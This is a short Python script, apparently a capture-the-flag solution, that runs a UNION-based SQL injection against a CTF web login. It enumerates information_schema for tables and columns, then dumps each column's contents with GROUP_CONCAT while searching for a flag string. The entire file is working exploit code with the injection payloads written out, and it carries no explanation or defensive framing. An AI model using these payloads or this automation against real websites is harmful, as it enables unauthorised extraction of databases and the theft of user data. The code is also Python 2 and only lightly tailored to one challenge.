import requests
from lxml import etree as ElementTree

r = requests.post('http://0491e9f58d3c2196a6e1943adef9a9ab734ff5c9.ctf.site:20000/', data={"username": "' AND 1=2 UNION SELECT CONCAT(table_schema,'.',table_name), column_name FROM information_schema.columns; -- "}).text

r += '</body></html'

x = ElementTree.fromstring(r, ElementTree.XMLParser(recover=True))

table = x.xpath("//table//tbody")[0]

things = []

for tr in table.findall("tr"):
	tab, col = [x.text.strip() for x in tr.findall("td")]
	things.append((tab, col))

things = things[300:]
print things
for table, column in things:
	r = requests.post('http://0491e9f58d3c2196a6e1943adef9a9ab734ff5c9.ctf.site:20000/',
	                  data={"username": "' AND 1=2 UNION SELECT 1, GROUP_CONCAT({} SEPARATOR ',') FROM {}; -- ".format(column, table)}).text
	print table, column
	if "EKO" in r[300:]:
		print r

